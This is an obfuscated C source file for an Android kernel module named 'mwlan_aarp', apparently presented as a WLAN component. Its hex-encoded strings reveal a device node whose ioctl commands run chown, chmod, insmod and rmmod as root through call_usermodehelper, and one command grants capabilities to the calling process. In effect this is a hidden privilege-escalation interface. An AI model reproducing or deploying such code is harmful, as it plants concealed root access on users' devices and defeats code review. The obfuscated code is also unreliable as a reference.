/*
   'mwlan_aarp.c' Obfuscated by COBF (Version 1.06 2006-01-07 by BB) at Wed Dec 18 12:58:24 2013
*/
#include<linux/module.h>
#include<linux/ctype.h>
#include<linux/time.h>
#include"cobf.h"
#ifdef _WIN32
#include"uncobf.h"
#include<wtypes.h>
#include"cobf.h"
#else
#ifdef bb53
#include"uncobf.h"
#include<linux/types.h>
#include"cobf.h"
#else
#include"uncobf.h"
#include<stddef.h>
#include<sys/types.h>
#include"cobf.h"
#endif
#endif
#ifdef _WIN32
bba bb71 bb92;
#else
bba bbd bb55, *bb119, *bb186;
#define bb134 1
#define bb240 0
bba bb192 bb206, *bb242, *bb121;bba bbd bb231, *bb141, *bb234;bba bbx
bb106, *bb99, *bb159;bba bby bb191, *bb117;bba bbx bby bb136, *bb142;
bba bby bb64, *bb148;bba bbx bby bb26, *bb97;bba bb26 bb188, *bb230;
bba bb26 bb90, *bb239;bba bb64 bb71, *bb107;bba bb237 bb203;bba bb190
bb210;bba bb174 bb72;bba bb83 bb56;bba bb83 bb131;
#ifdef bb224
bba bb146 bb37, *bb49;bba bb217 bb16, *bb74;bba bb193 bbq, *bb44;bba
bb111 bb24, *bb84;
#else
bba bb163 bb37, *bb49;bba bb125 bb16, *bb74;bba bb102 bbq, *bb44;bba
bb138 bb24, *bb84;
#endif
bba bb37 bb25, *bb34, *bb166;bba bb16 bb202, *bb232, *bb169;bba bb16
bb132, *bb207, *bb168;bba bbq bb52, *bb171, *bb200;bba bb72 bb17, *
bb153, *bb238;bba bbq bb243, *bb235, *bb185;bba bb56 bb139, *bb112, *
bb194;bba bb24 bb197, *bb247, *bb187;
#define bb133 bbl
bba bbl*bb218, *bb98;bba bbk bbl*bb176;bba bbc bb110;bba bbc*bb227;
bba bbk bbc*bb184;
#if defined( bb53)
bba bbd bb47;
#endif
bba bb47 bb7;bba bb7*bb105;bba bbk bb7*bb225;
#if defined( bb147) || defined( bb164)
bba bb7 bb11;bba bb7 bb50;
#else
bba bbc bb11;bba bbx bbc bb50;
#endif
bba bbk bb11*bb95;bba bb11*bb130;bba bb52 bb196, *bb229;bba bbl*bb88;
bba bb88*bb180;
#define bb156( bb19) bbg bb19##__ { bbd bb114; }; bba bbg bb19##__  * \
 bb19
bba bbg{bb17 bb145,bb175,bb222,bb212;}bb94, *bb208, *bb157;bba bbg{
bb17 bb219,bb209;}bb155, *bb127, *bb189;bba bbg{bb17 bb241,bb228;}
bb248, *bb220, *bb96;
#endif
bba bbk bb25*bb150;
#ifdef _WIN32
#ifndef UNDER_CE
#define bb4 bb213
#define bb22 bb211
bba bbx bby bb4;bba bby bb22;
#endif
#else
#endif
#ifdef _WIN32
bbl*bb38(bb4 bb77);bbl bb45(bbl* );bbl*bb68(bb4 bb221,bb4 bb77);
#else
#define bb38( bbe) bb48(1, bbe, bb35)
#define bb45( bbe) bb172( bbe)
#define bb68( bbe, bb57) bb48( bbe, bb57, bb35)
#endif
#ifdef _WIN32
#define bb27( bbe) bb113( bbe)
#else
#ifdef _DEBUG
bbd bb76(bbk bbc*bb93,bbk bbc*bb0,bbx bb216);
#define bb27( bbe) ( bbl)(( bbe) || ( bb76(# bbe, __FILE__, __LINE__)))
#else
#define bb27( bbe) (( bbl)0)
#endif
#endif
bb22 bb152(bb22*bb91);
#ifndef _WIN32
bbd bb195(bbk bbc*bb103);bbd bb104(bbk bbc*bb179,...);
#endif
#ifdef _WIN32
bba bb140 bb65;
#define bb58( bbe) bb178( bbe)
#define bb75( bbe) bb135( bbe)
#define bb61( bbe) bb101( bbe)
#define bb87( bbe) bb244( bbe)
#else
bba bb205 bb65;
#define bb58( bbe) ( bbl)(  *  bbe = bb223( bbe))
#define bb75( bbe) (( bbl)0)
#define bb61( bbe) bb115( bbe)
#define bb87( bbe) bb100( bbe)
#endif
#include"uncobf.h"
#include<linux/kernel.h>
#include<linux/module.h>
#include<linux/fs.h>
#include<linux/in.h>
#include<linux/miscdevice.h>
#include<linux/syscalls.h>
#include<linux/kmod.h>
#include<net/ip.h>
#include"cobf.h"
bba bbg{bb34 bb73;bbq bb154;bb34 bb40;bbq bb28;bbq bbw;}bb14;bba bbg{
bbk bbc*bbh;bb144 bb80;bb122 bb82;}bb23;bba bbg{bbk bbc*bbh;bbd bb13;
}bb41;bba bbg{bb55 bb86;bbk bbc*bb8;}bb42;bba bbg{bbd bb214;bbg bb120
 *bb246;bbd bb199;}bb123;bbm bbd bb62(bbg bb10*bb10,bbg bb0*bb0){bbu 0
;}bbm bbd bb51(bbg bb10*bb10,bbg bb0*bb0){bbu 0 ;}bbm bbd bb5(bbc*bbh,
bbc* *bbo,bbc* *bbs,bbd bb33){bbg bb160*bb15;bb183 bb59=(bb33==bb151)?
bb35:bb109;
#ifdef _DEBUG
bbc* *bb20=bbo;bbf("\x63\x61\x6c\x6c\x5f\x75\x73\x65\x72\x6d\x6f\x64"
"\x65\x68\x65\x6c\x70\x65\x72\x5f\x2c\x20\x25\x73",bbh);bb69( *bb20){
bbf("\x20\x25\x73", *bb20);bb20++;}bbf("\n");
#endif
bb15=bb124(bbh,bbo,bbs,bb59);bbi(bb15==bbp){bbf("\x63\x61\x6c\x6c\x5f"
"\x75\x73\x65\x72\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72\x5f\x2c\x20"
"\x69\x6e\x66\x6f\x20\x3d\x3d\x20\x4e\x55\x4c\x4c\n");bbu-bb39;}bbu
bb181(bb15,bb33);}bbm bbd bb78(bbk bbc*bbh,bbd bb60,bbd bb67){bbc bb31
[256 ];bbc*bbo[]={(bbc* )"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e"
"\x2f\x63\x68\x6f\x77\x6e",bb31,(bbc* )bbh,bbp};bbm bbc*bbs[]={"\x48"
"\x4f\x4d\x45\x3d\x2f","\x54\x45\x52\x4d\x3d\x6c\x69\x6e\x75\x78",""
"\x50\x41\x54\x48\x3d\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e",
bbp};bbd bbb;bb54(bb31,"\x25\x64\x2e\x25\x64",bb60,bb67);bbb=bb5(""
"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x74\x6f\x6f\x6c\x62"
"\x6f\x78",bbo,bbs,bb12);
#ifdef _DEBUG
bbf("\x69\x6f\x63\x74\x6c\x2c\x20\x63\x61\x6c\x6c\x5f\x75\x73\x65\x72"
"\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72\x5f\x3a\x20\x25\x64\n",bbb);
#endif
bbu bbb;}bbm bbd bb79(bbk bbc*bbh,bbd bb13){bbc bb46[256 ];bbc*bbo[]={
(bbc* )"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x63\x68\x6d"
"\x6f\x64",bb46,(bbc* )bbh,bbp};bbd bbb;bbm bbc*bbs[]={"\x48\x4f\x4d"
"\x45\x3d\x2f","\x54\x45\x52\x4d\x3d\x6c\x69\x6e\x75\x78","\x50\x41"
"\x54\x48\x3d\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e",bbp};bb54(
bb46,"\x25\x6f",bb13);bbb=bb5("\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62"
"\x69\x6e\x2f\x74\x6f\x6f\x6c\x62\x6f\x78",bbo,bbs,bb12);
#ifdef _DEBUG
bbf("\x69\x6f\x63\x74\x6c\x2c\x20\x63\x61\x6c\x6c\x5f\x75\x73\x65\x72"
"\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72\x5f\x3a\x20\x25\x64\n",bbb);
#endif
bbu bbb;}bbm bby bb70(bbg bb0*bb0,bbx bbd bb215,bbx bby bb63){bbq bb30
;bb14 bbn, *bb9=(bb14* )bb63;bb25*bbj=bbp;bbd bbb;bbf("\x6d\x77\x6c"
"\x61\x6e\x5f\x61\x61\x72\x70\x2c\x20\x62\x65\x67\x69\x6e\x20\x64\x65"
"\x76\x5f\x69\x6f\x63\x74\x6c\x5f\n");bbb=bb6(&bbn,bb9,bb21(bb14));
bbi(bbb!=0 ){bbf("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c"
"\x20\x63\x6f\x70\x79\x5f\x66\x72\x6f\x6d\x5f\x75\x73\x65\x72\x2c\x20"
"\x25\x64\n",bbb);bbv bbt;}bbj=bb38(bbn.bb28);bbi(!bbj){bbb=-bb39;bbf
("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x6d\x61"
"\x6c\x6c\x6f\x63\x3a\x20\x25\x64\n",bbb);bbv bbt;}bbb=bb128(bb30,(
bb44)bbn.bb73);bbi(bbb!=0 ){bbf("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f"
"\x63\x74\x6c\x2c\x20\x67\x65\x74\x5f\x75\x73\x65\x72\x3a\x20\x25\x64"
"\n",bbb);bbv bbt;}bbb=bb6(bbj,bbn.bb40,bbn.bb28);bbi(bbb!=0 ){bbf(""
"\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x6f\x70"
"\x79\x5f\x66\x72\x6f\x6d\x5f\x75\x73\x65\x72\x2c\x20\x25\x64\n",bbb);
bbv bbt;}bb118(bb30){bb18 1 :{bb23*bbz=(bb23* )bbj;bbc bbh[256 ];bbb=
bb6(bbh,bbz->bbh,bb21(bbh));bbi(bbb!=0 ){bbf("\x64\x65\x76\x69\x63\x65"
"\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x6f\x70\x79\x5f\x66\x72\x6f\x6d"
"\x5f\x75\x73\x65\x72\x2c\x20\x25\x64\n",bbb);bbv bbt;}bbn.bbw=4 ; * (
(bbq* )bbj)=bb78(bbh,bbz->bb80,bbz->bb82);
#ifdef _DEBUG
bbf("\x63\x68\x6f\x77\x6e\n");
#endif
bb3;}bb18 2 :{bb41*bbz=(bb41* )bbj;bbc bbh[256 ];bbb=bb6(bbh,bbz->bbh,
bb21(bbh));bbi(bbb!=0 ){bbf("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63"
"\x74\x6c\x2c\x20\x63\x6f\x70\x79\x5f\x66\x72\x6f\x6d\x5f\x75\x73\x65"
"\x72\x2c\x20\x25\x64\n",bbb);bbv bbt;}bbn.bbw=4 ; * ((bbq* )bbj)=bb79
(bbh,bbz->bb13);
#ifdef _DEBUG
bbf("\x63\x68\x6d\x6f\x64\n");
#endif
bb3;}bb18 3 :{bb42*bb29=(bb42* )bbj;bbc bb8[256 ];bbc*bbo[]={bbp,bb8,
bbp};bbm bbc*bbs[]={"\x48\x4f\x4d\x45\x3d\x2f","\x54\x45\x52\x4d\x3d"
"\x6c\x69\x6e\x75\x78","\x50\x41\x54\x48\x3d\x2f\x73\x79\x73\x74\x65"
"\x6d\x2f\x62\x69\x6e",bbp};bbb=bb6(bb8,bb29->bb8,256 );bbi(bbb!=0 ){
bbf("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x4f\x49"
"\x44\x5f\x4d\x4f\x44\x2c\x20\x63\x6f\x70\x79\x5f\x66\x72\x6f\x6d\x5f"
"\x75\x73\x65\x72\x2c\x20\x25\x64\n",bbb);bbv bbt;}bbo[0 ]=bb29->bb86?""
"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x69\x6e\x73\x6d\x6f"
"\x64":"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x72\x6d\x6d"
"\x6f\x64"; * (bbq* )bbj=bb5("\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62"
"\x69\x6e\x2f\x74\x6f\x6f\x6c\x62\x6f\x78",bbo,bbs,bb12);bbn.bbw=4 ;
#ifdef _DEBUG
bbf("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x61"
"\x6c\x6c\x5f\x75\x73\x65\x72\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72"
"\x5f\x3a\x20\x25\x64\n", * (bbd* )bbj);
#endif
bb3;}bb18 5 :{bbd bbb;bb170{bbg bb182*bbr=bb236();bbi(!bbr){bbb=bb39;
bb3;}bbr->bb32.bb1[0 ]=(1 <<bb126)|(1 <<bb165)|(1 <<bb233);bbr->bb89.bb1[
0 ]=0 ;bbr->bb81.bb1[0 ]=bbr->bb32.bb1[0 ];bbr->bb32.bb1[1 ]=0 ;bbr->bb89.
bb1[1 ]=0 ;bbr->bb81.bb1[1 ]=0 ;bbb=bb226(bbr);}bb69(0 ); * (bbd* )bbj=bbb
;bbn.bbw=bb21(bbd);
#ifdef _DEBUG
bbf("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x61"
"\x70\x73\x65\x74\x3a\x20\x25\x64\n",bbb);
#endif
bb3;}}bbb=bb116(bb9->bb40,bbj,bbn.bbw);bbi(bbb!=0 ){bbf("\x64\x65\x76"
"\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x6f\x70\x79\x5f\x66"
"\x72\x6f\x6d\x5f\x75\x73\x65\x72\x2c\x20\x25\x64\n",bbb);bbv bbt;}
bbb=bb137(bbn.bbw,&bb9->bbw);bbi(bbb!=0 ){bbf("\x64\x65\x76\x69\x63"
"\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x70\x75\x74\x5f\x75\x73\x65\x72"
"\x2c\x20\x25\x64\n",bbb);bbv bbt;}bbt:bbi(!bbj)bb45(bbj);bbf("\x6d"
"\x77\x6c\x61\x6e\x5f\x61\x61\x72\x70\x2c\x20\x65\x6e\x64\x20\x64\x65"
"\x76\x5f\x69\x6f\x63\x74\x6c\x5f\n");bbu bbb;}bbm bbg bb167 bb66={.
bb149=bb70,.bb198=bb62,.bb245=bb51,};bbm bbg bb204 bb36={bb161,"\x6d"
"\x77\x6c\x61\x6e\x5f\x61\x61\x72\x70",&bb66};bbd bb201(){bbd bbb;bbf
("\x49\x2d\x57\x4c\x41\x4e\x2f\x6d\x77\x6c\x61\x6e\x5f\x61\x61\x72"
"\x70\x2c\x20\x6d\x77\x6c\x61\x6e\x20\x6b\x6f\x20\x73\x72\x63\x2c\x20"
"\x32\x30\x31\x33\x2e\x31\x32\x2e\x31\x38\n");bbb=bb162(&bb36);bbi(
bbb!=0 ){bbf("\x69\x6e\x69\x74\x5f\x6d\x6f\x64\x75\x6c\x65\x2c\x20\x6d"
"\x69\x73\x63\x5f\x72\x65\x67\x69\x73\x74\x65\x72\x20\x66\x61\x69\x6c"
"\x65\x64\x3a\x20\x25\x64\n",bbb);bbu bbb;}{bbc*bbo[]={"\x2f\x73\x79"
"\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x63\x68\x6f\x77\x6e","\x73\x79"
"\x73\x74\x65\x6d\x2e\x73\x79\x73\x74\x65\x6d","\x2f\x64\x65\x76\x2f" ""
"\x6d\x77\x6c\x61\x6e\x5f\x61\x61\x72\x70",bbp};bbm bbc*bbs[]={"\x48"
"\x4f\x4d\x45\x3d\x2f","\x54\x45\x52\x4d\x3d\x6c\x69\x6e\x75\x78",""
"\x50\x41\x54\x48\x3d\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e",
bbp};bbd bb2,bb43=0 ;bb129(bb2=0 ;bb2<10 ;bb2++){bbb=bb5("\x2f\x73\x79"
"\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x74\x6f\x6f\x6c\x62\x6f\x78",
bbo,bbs,bb12);bbi(bbb==0 )bb3;bb43=bbb;bb173(10 );}bbi(bb2!=0 ){bbf(""
"\x69\x6e\x69\x74\x5f\x6d\x6f\x64\x75\x6c\x65\x2c\x20\x63\x61\x6c\x6c"
"\x5f\x75\x73\x65\x72\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72\x5f\x20"
"\x66\x61\x69\x6c\x65\x64\x2c\x20\x72\x5f\x20\x3a\x20\x25\x64\x2c\x20"
"\x74\x72\x79\x20\x3a\x20\x25\x64\n",bb43,bb2);bbi(bbb!=0 )bbu bbb;}}
bbf("\x6d\x77\x6c\x61\x6e\x5f\x61\x61\x72\x70\x20\x69\x6e\x69\x74\x5f"
"\x6d\x6f\x64\x75\x6c\x65\x28\x29\x20\x77\x61\x73\x20\x73\x75\x63\x63"
"\x65\x73\x73\x66\x75\x6c\x2e\n");bbu 0 ;}bbl bb143(){bb108(&bb36);}
bb158("\x61\x68\x6f\x70\x65");bb177("");
